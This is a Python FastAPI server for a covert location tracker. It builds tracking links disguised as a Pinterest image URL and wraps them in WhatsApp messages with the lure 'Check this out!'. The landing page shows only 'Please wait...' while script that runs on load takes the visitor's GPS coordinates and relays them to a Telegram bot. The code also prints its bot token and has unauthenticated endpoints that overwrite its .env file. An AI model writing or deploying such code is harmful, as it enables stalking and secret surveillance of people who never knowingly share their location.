import uuid
from fastapi import FastAPI, Form, Request
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from dotenv import load_dotenv
from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.responses import JSONResponse, HTMLResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from dotenv import load_dotenv
import requests
import os
import json
import uuid
import uvicorn

# Load the .env file
load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), '.env'))

print("TELEGRAM_TOKEN:", os.getenv("TELEGRAM_TOKEN"))
print("CHAT_ID:", os.getenv("CHAT_ID"))

app = FastAPI()

# Define the correct path for static files
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FRONTEND_PATH = os.path.join(BASE_DIR, "..", "frontend")

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    # Add the domain of your frontend
    allow_origins=["https://frontend-localizador.vercel.app"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


class LocationData(BaseModel):
    id: str
    latitude: float
    longitude: float


# In-memory database
active_links = {}


def send_to_telegram(message: str):
    telegram_token = os.getenv("TELEGRAM_TOKEN")
    url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
    params = {
        "chat_id": os.getenv("CHAT_ID"),
        "text": message,
    }
    try:
        response = requests.post(url, data=params)
        response_data = response.json()
        if response.status_code != 200 or not response_data.get("ok"):
            print(f"Error sending message to Telegram: {response_data}")
        return response_data
    except Exception as e:
        print(f"Failed to connect to Telegram: {e}")
        return {"error": str(e)}


@app.get("/")
async def serve_html():
    index_path = os.path.join(FRONTEND_PATH, "index.html")
    if not os.path.exists(index_path):
        raise HTTPException(status_code=404, detail="index.html not found")
    return FileResponse(index_path)


@app.post("/send-location/")
async def send_location(location: LocationData):
    if location.id not in active_links:
        raise HTTPException(status_code=404, detail="Invalid ID")

    message = f"📍 Location received!\n🌍 Latitude: {location.latitude}\n📍 Longitude: {location.longitude}"
    send_to_telegram(message)

    return {"message": "Location sent!"}


@app.get("/generate-link/")
async def generate_link():
    unique_id = str(uuid.uuid4())[:8]
    tracking_url = f"https://i.pinimg.com/236x/eb/3f/da/eb3fda4cfda1efd0f29d20994af4696e.jpg/track/{unique_id}"
    active_links[unique_id] = {"status": "waiting"}
    return JSONResponse(content={"link": tracking_url})


@app.get("/track/{tracking_id}")
async def track_user(tracking_id: str):
    if tracking_id not in active_links:
        raise HTTPException(status_code=404, detail="Invalid link")

    html_content = f"""
    <html>
    <head>
        <script>
            function sendLocation() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition((position) => {{
                        fetch("/send-location/", {{
                            method: "POST",
                            headers: {{"Content-Type": "application/json"}},
                            body: JSON.stringify({{
                                id: "{tracking_id}",
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            }})
                        }});
                    }});
                }}
            }}
            window.onload = sendLocation;
        </script>
    </head>
    <body>
        <h1>Please wait...</h1>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)


@app.get("/send-whatsapp/")
async def send_whatsapp():
    response = await generate_link()
    response_json = json.loads(response.body.decode("utf-8"))
    tracking_url = response_json.get("link", "")

    if not tracking_url:
        raise HTTPException(status_code=500, detail="Failed to generate link")

    whatsapp_link = f"https://api.whatsapp.com/send?text=Check this out! {tracking_url}"
    return JSONResponse(content={"whatsapp_link": whatsapp_link})


@app.get("/config")
async def config_form():
    html_content = """
    <html>
    <head><title>Telegram Bot Configuration</title></head>
    <body>
        <h1>Configure your Telegram Bot</h1>
        <form action="/save-config" method="post">
            <label for="telegram_token">Telegram Token:</label>
            <input type="text" id="telegram_token" name="telegram_token" required><br><br>
            <label for="chat_id">Chat ID:</label>
            <input type="text" id="chat_id" name="chat_id" required><br><br>
            <button type="submit">Save Configuration</button>
        </form>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)


@app.post("/save-config")
async def save_config(telegram_token: str = Form(...), chat_id: str = Form(...)):
    with open('.env', 'w') as f:
        f.write(f"TELEGRAM_TOKEN={telegram_token}\n")
        f.write(f"CHAT_ID={chat_id}\n")

    load_dotenv()

    return {"message": "Configuration saved successfully!"}

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8080))  # Use PORT environment variable
    uvicorn.run(app, host="0.0.0.0", port=port)
